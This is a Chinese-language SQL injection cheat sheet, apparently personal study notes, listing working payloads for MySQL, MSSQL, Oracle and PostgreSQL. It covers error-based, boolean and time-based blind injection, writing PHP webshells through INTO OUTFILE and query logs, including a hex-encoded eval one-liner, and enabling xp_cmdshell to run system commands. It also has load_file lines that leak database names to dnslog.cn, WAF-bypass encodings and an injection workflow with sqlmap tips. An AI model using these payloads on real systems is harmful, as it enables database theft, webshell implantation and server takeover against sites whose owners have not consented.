[博客](http://sqlwiki.batmanfuture.cn/)

https://www.jianshu.com/p/bc35f8dd4f7c

https://www.jianshu.com/p/fcae21926e5c

函数手册

mssql:https://cankaoshouce.com/sql/sqlserver-function.html

mysql:https://www.sjkjc.com/mysql-ref/ascii/



###### GTID_SUBSET

~~~http
字符串
	字符型：1) and GTID_SUBSET(concat(char(126),(database())),5201)-- test
	数字型：1 and GTID_SUBSET(concat(char(126),(database())),5201)-- test
~~~

![](https://s3.bmp.ovh/imgs/2022/10/23/5b4a240b49b69280.png)



~~~http
在SQL语句中有asc和desc的出现，他们的作用是对某个标签按照从小到大或者从大到小排序，如果我们请求包中发现了asc和desc，我们可以尝试在后面增加内容判断SQL注入
在mysql当中，如果select 1/0，虽然会警告，但依旧会返回正常内容，但是在oracle中，1/0会报错，并不能返回，相当于一个变种的报错判断

排序注入
SELECT * FROM ty_user ORDER BY id-(updatexml(1,concat(0x7e,user()),0));
desc = -(updatexml(1,concat(0x7e,user()),0))


select * from ty_user where id= '1' LIMIT 0,1 INTO OUTFILE 'D:\\phpStudy\\phpstudy_pro\\WWW\\123456aaaa.php' LINES TERMINATED BY "<?php phpinfo();?>";

SELECT * FROM ty_user ORDER BY if(substr(database(),1,1)='w',id,exp(710));

~~~



~~~http
mysql:
	'||if(substr(database(),1,1)='x',1,exp(710))||'
	"||if(substr(database(),1,1)='x',1,exp(710))||"
	也就是user()的第1位如果是x那么正常，反之报错
~~~



~~~http
数字型布尔盲注：
||ascii(if(substring(db_name(),1,1)))=10,1,0)||
1/if(ascii(substr(database(),1,1))=116,1,exp(710))

userName=1'if(ascii(substring(db_name(),1,1)))>50%20WAITFOR%20DELAY%20'0:0:5'--%20

~~~

~~~http
select * from ty_user where id=1-if(ascii(left(database(),1))=118,1,exp(710))
~~~



#### MYSQL-getshell

##### 1）全局日志写入

~~~
//是否开启全局日志，设置开启并确定写入路径
show variables like '%general%';
set global general_log=on;
set global general_log_file = 'D:/phpStudy/phpstudy_pro/WWW/log.php';

//日志记录方式设置成file
show variables like 'log_output';
set global log_output='file';

//新建查询，然后写入webshell
select '<?php phpinfo();?>';
~~~

[![ppg71JI.png](https://s1.ax1x.com/2023/03/30/ppg71JI.png)](https://imgse.com/i/ppg71JI)[![ppg73Wt.png](https://s1.ax1x.com/2023/03/30/ppg73Wt.png)](https://imgse.com/i/ppg73Wt)

##### 2）into outfile / into dumpfile

~~~
//查看secure-file-priv参数的值，5.6以下默认是空，以上是null
show global variables like '%secure%';
//可以在webshell下修改这个mysql.ini的值
~~~

[![ppg7sS0.png](https://s1.ax1x.com/2023/03/30/ppg7sS0.png)](https://imgse.com/i/ppg7sS0)

~~~
//黑盒
?id=1 union select 1,"<?php phpinfo();?>",3 into outfile 'E:/study/WWW/evil.php'

?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile "E:/study/WWW/evil.php"

?id=1 INTO OUTFILE '物理路径' lines terminated by  （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' fields terminated by （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' columns terminated by （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' lines starting by    （一句话hex编码）#



//白盒
select "<?php phpinfo();?>" into outfile 'D:/phpStudy/phpstudy_pro/WWW/evil.php';

C:/ProgramData/MySQL/MySQL Server 8.0/Uploads/

~~~



##### 3）读文件

~~~
//黑盒
http://test.com/sqli/Less-1/?id=-1' union select 1,load_file('c:\\flag.txt'),3 --+
http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,2,load_file(concat('\\\\',(select database()),'.l4sq34.dnslog.cn\\abc'))--+
//白盒
select load_file('D:/phpStudy/phpstudy_pro/WWW/test.php');
select load_file(concat('\\\\',(select database()),'.c21hol.dnslog.cn\\abc'));
~~~



##### 4）导出

~~~
use mysql;
CREATE TABLE test( id text(500) not null);
INSERT INTO test (id) VALUES('<?php phpinfo();?>');
SELECT id FROM test INTO OUTFILE 'D:/phpStudy/phpstudy_pro/WWW/batman.php';
~~~



##### 5）慢日志写入

~~~
show variables like '%slow_query_log%';
set global slow_query_log=1;
set global slow_query_log_file='D:/phpStudy/phpstudy_pro/WWW/batman123.php';
show global variables like '%long_query_time%';
select '<?php phpinfo();?>' or sleep(11);
~~~



~~~
1'%20LIMIT%200,1%20load_file('C:/ProgramData/360/log/test.txt');

~~~









~~~
//报错
1' and 1=(db_name())--+
//布尔
and len(db_name())>5
and ascii (substring(db_name(),1,1))>95

1'and ascii (substring(db_name(),1,1))>95 --%20

1' and substring(db_name(2),1,1)='n'--+

~~~





~~~c#
// 判断是不是dba权限
select is_srvrolemember('sysadmin')

//命令执行
execute ('sp_configure "show advanced options",1');
execute ('reconfigure');
execute ('sp_configure "xp_cmdshell", 1');
execute ('reconfigure');
execute ('sp_configure');
execute ('xp_cmdshell "net user"'); 
// 判断是不是站库分离
select host_name(); //主机名
select @@servername; //服务器名
~~~





#### SQL注入拿shell

通过SQL注入拿shell一般就是两种方式：

~~~
select host_name();//主机名
select @@servername;//服务器名
//如果相同则代表数据库和web在同一台机器上面
~~~



###### 1.利用命令执行函数

~~~http
mysql：sys_exec，sys_eval		也是在利用mysql提权时利用到的函数
mssql：xp_cmdshell(利用sp_oacreate函数开启)

execute ('sp_configure "show advanced options",1');
execute ('reconfigure');
execute ('sp_configure "xp_cmdshell", 1');
execute ('reconfigure');
execute ('sp_configure');
execute ('xp_cmdshell "net user"'); 

~~~

[![pSL17b4.png](https://s1.ax1x.com/2023/02/18/pSL17b4.png)](https://imgse.com/i/pSL17b4)









###### 其他：load_file读文件

load_file()读文件

http://test.com/sqli/Less-1/?id=-1' union select 1,load_file('c:\\flag.txt'),3 --+

###### 关键字替换

比如在mysql中，waf将sleep()函数列入了黑名单，可以通过具备相同功能的benchmark()函数来实现绕过

~~~
< > 等价于 BETWEEN
= 等价于 like
Hex() bin() 等价于ascii()
Sleep() 等价于 benchmark()
Mid()substring() 等价于 substr(）
@@user 等价于 User()
@@Version 等价于 version()
(mysql支持&& || ,oracle不支持 && ||）
~~~



###### 2.特殊符号

原理：结合不同数据库的特性来实现绕过。(最好是可以找到waf开发者都不了解的某些特性),以下是两个广为流传的小特性

~~~
比如 "+" select+password+from+mysql.user 相当于是一个空格的作用

"'"放在mysql的末尾会起到注释符的作用
~~~



###### 3.编码

可以结合各种编码方式来绕过,比如url编码，url双重编码,十六进制编码，unicode编码，数据库编码等。

举个栗子：mysql默认的字符集是latin,因此在php代码里面设置的字符集为 utf-8,这只是客户端的字符集，因此存在字符集装换的问题utf-8—>latin,若传进来的字符集不是完整的字符，则会导致不完整的字符自动会忽略的问题，比如username=admin%c2 , 由于%c2不是一个完整的utf-8字符 因此传到Mysql 里面 自动忽略了，导致查出的是admin用户的数据，可以利用这个特性绕过

###### 4.注释符

/*xxx*/是注释，也可以充当空白符。因为 /**/可使得MySQL对sql语句(union/**/select)词法解析成功。事实上许多WAF都考虑到/**/可以作为空白分，但是waf检测 “/*.**/”很消耗性能，工程师会折中，可能在检测中间引入一些特殊字符，例如：/*w+*/。或者，WAF可能只中间检查n个字符“/*.{,n}*/”。根据以上想法，可以逐步测试绕过方法：

先测试最基本的：union/**/select再测试中间引入特殊字：union/*aaaa%01bbs*/select最后测试注释长度：

~~~
union/*aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa*/select
~~~

###### 5.空白符绕过

mysql中有一堆特殊的url编码在mysql命令行中是以空格方式表示：比如%0a,%a0,%0C。

基于正则表达式的WAF， SQL注入规则使用正则表达式的“s”匹配空格，例如”selects+union”。

利用空白符进行绕过，测试WAF时尽可能减少其他原因的影响，例如”union select”被拦截，只需把中间空白符替换为”%250C”, “%25A0”进行绕过测试

~~~
union%250Cselect

union%25A0select
~~~

函数分隔符对基于正则表达式的WAF，我们猜测安全工程师写WAF规则时，可能不知道函数名与左括号之间可以存在特殊字符，或者遗漏可以存在特殊字符。例如匹配函数”concat()”的规则写法，“concat(”或者”concats*(”，就没有考虑到一些特殊字符

~~~
concat%2520(

concat/**/(

concat%250c(

concat%25a0(
~~~

###### 6.浮点数词法解析

利用MySQL解析浮点数的特点，正则表达式无法匹配出单词union，但是MySQL词法解析成功解析出浮点数、sql关键字union

~~~
select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0

select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0
~~~

###### 7.报错注入

Error-based的SQL注入函数非常容易被忽略，导致WAF规则过滤不完整。常见的函数

~~~
updatexml(1, concat(0x5d,md5(3)),1);
GeometryCollection((select*from(select*from(select@@version)f)x))
polygon((select*from(select name_const(version(),1))x))
linestring()
multipoint()
multilinestring()
multipolygon()
~~~

### 数据库种类

##### MSSQL注入

这里只要测试下面语句成功执行，那么放进sqlmap跑就行了

~~~sql
查询版本
1' and @@version>0--       

查询权限
1' and user>0--  
~~~



~~~
如果上传不成功，有三种原因
第一是mysql高版本的安全模式，secure_file_priv的值为null。 
第二种是secure_file_priv指定了某个目录才可以上传，根目录不允许上传，那么可以尝试往upload目录上传
第三种是secure_file_priv的值为空或者指定了某个目录，但是上传后的文件为空，没有内容写进去。那么可能是limit的前面语句为False，导致limit后面的语句没有执行。加上 or 1=1即可

    第一种情况：进入--sql-shell
    show global variables like '%secure%';
    当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出，那就无法写入马

    第二种情况：
    往upload等其他目录上传，不要往根目录上传

    第三种情况：
    如果secure_file_priv的值为空也写不进去，那就尝试手动写入，使用--proxy "http://127.0.0.1:8080"，burp抓到包后，手动写入。limit语句前面加上or '1'='1'
~~~



~~~
%5c，%bf', 单引号，双引号，反斜杠，负数，特殊字符，and，or，xor探测是否存在注入！！！

注意：（-- ）一定要在注释符号后加空格，或者URL编码后的空格（%20），否则注释符号不会产生作用。
            注释符# --+交替用，一个不行，就另一个
1、先判断是数字型还是字符型，如果判断不出来跳到9
2、接着判断有没有括号
3、最后面跟上--+注释符
4、order by判断字段数，如果没法判断，则直接union select 1,2,3一个个测试过去
5、如果返回的页面发生变化，则联合查询
6、如果union select 1,version(),3返回的页面没有发生变化，即联合查询失败，则尝试报错注入
7、如果报错注入页面也没有把信息显示出来，则延时注入
8、如果延时注入也不行，则导入导出
9、尝试延时注入，如果从1过来的，则三种情况，直接跟payload，参数后面加单引号或者双引号
~~~



## Payload

~~~mysql
# 布尔


# 延时， 如果过了5秒才显示页面，则存在注入
mysql:        BENCHMARK(100000,MD5(1))  or sleep(5)
              id=1' and sleep( if( (select length(database()) >0) , 5, 0 ) )%23
              id=1' and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+    如果数据库的第一位不是s则延迟5秒才反应
              id=1' or sleep(ord(substr(password,1,1))) --
              id=1'XOR(sleep(if((select length(database()) >6),0,5)))XOR'Z
              id=1'and (SELECT 1 FROM (SELECT(SLEEP(5)))Gbqj) --+
              id=1'/**/AND/**/(SELECT/**/*/**/FROM/**/(SELECT(SLEEP(5)))ibEg)/**/AND/**/'        这个语句绝对ok
              Referer:1'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
              ua:'(6),0))XOR'Z
              x-forw:'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z

mssql:        id=1' WAITFOR DELAY '0:0:5'--+                                  这个语句绝对ok
              id=1';WAITFOR DELAY '0:0:5'--+                                   这个语句绝对ok
              id=1');WAITFOR DELAY '0:0:5'--+                                  这个语句绝对ok

              id=1" WAITFOR DELAY '0:0:5'--+                                  这个语句绝对ok
              id=1";WAITFOR DELAY '0:0:5'--+                                   这个语句绝对ok
              id=1");WAITFOR DELAY '0:0:5'--+                                  这个语句绝对ok

              id=1' or 51 = '49'; WAITFOR DELAY '0:0:5'--+                     这个语句绝对ok
              id=1' AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A' --+ 
              id=1' if 1=1 waitfor delay '0:0:5' else waitfor delay '0:0:0'--+ 
                ',0)if 9527=9528-2 waitfor delay'0:0:5'--+ 
                if (system_user!='sa') waitfor delay '0:0:5' --+        这个语句绝对ok
                WHILE 2>1 PRINT 1----

                /***/and/***/sleep(/***/if(/***/(select/***/length(database())/***/>0)/***/,/***/10,/***/0/***/)/***/)%23
/***/and/***/If(ascii(substr(database(),1,1))=1,1,sleep(10))--+
/***/WAITFOR/***/DELAY/***/'0:0:10'--+
;WAITFOR/***/DELAY/***/'0:0:10'--+
);WAITFOR/***/DELAY/***/'0:0:10'--+

'/***/and/***/sleep(/***/if(/***/(select/***/length(database())/***/>0)/***/,/***/10,/***/0/***/)/***/)%23
'/***/and/***/If(ascii(substr(database(),1,1))=1,1,sleep(10))--+
'/***/WAITFOR/***/DELAY/***/'0:0:10'--+
';WAITFOR/***/DELAY/***/'0:0:10'--+
');WAITFOR/***/DELAY/***/'0:0:10'--+

"/***/and/***/sleep(/***/if(/***/(select/***/length(database())/***/>0)/***/,/***/10,/***/0/***/)/***/)%23
"/***/and/***/If(ascii(substr(database(),1,1))=1,1,sleep(10))--+
"/***/WAITFOR/***/DELAY/***/'0:0:10'--+
";WAITFOR/***/DELAY/***/'0:0:10'--+
");WAITFOR/***/DELAY/***/'0:0:10'--+



Postgresql        PG_SLEEP(5)   OR GENERATE_SERIES(1,10000)




# 报错注入，爆数据库版本
以下payload都是数字型，如果是字符型，就在1后面添加单引号或者双引号

id=1+and (select 1 from(select count(*),concat(0x5e5e5e,version(),0x5e5e5e,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--+
id=1 and (select 1 from (select count(*),concat(0x5e,version(),0x5e,floor(rand(0)*2))b from information_schema.tables group by b)a)
id=1 union select count(*),1,concat(0x5e5e5e,version(),0x5e5e5e,floor(rand(0)*2))x from information_schema.tables group by x --+                                使用联合的时候，要注意select的字段数量，该语句是3个，count，1，concat

id=1+and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--+
id=1+and (extractvalue(1,concat(0x7e,(select user()),0x7e)))--+
id=1+and geometrycollection((select * from(select * from(select user())a)b))--+
id=1+and multipoint((select * from(select * from(select user())a)b))--+
id=1+and polygon((select * from(select * from(select user())a)b))--+
id=1+and multipolygon((select * from(select * from(select user())a)b))--+
id=1+and linestring((select * from(select * from(select user())a)b))--+
id=1+and multilinestring((select * from(select * from(select user())a)b))--+
id=1+and exp(~(select * from(select user())a))--+
PostgreSQL: /?param=1 and(1)=cast(version() as numeric)--+
MSSQL: /?param=1 and(1)=convert(int,@@version)--+
Sybase: /?param=1 and(1)=convert(int,@@version)--+
Oracle >=9.0: /?param=1 and(1)=(select upper(XMLType(chr(60)||chr(58)||chr(58)||(select --+
replace(banner,chr(32),chr(58)) from sys.v_$version where rownum=1)||chr(62))) from dual)--+


Oracle报错注入
' AND 1932=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(122)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (1932=1932) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(118)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL) AND 'mgBW'='mgBW
如果sqlmap跑不出，则加参数--level 5 --risk 3

risk
共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。
~~~



































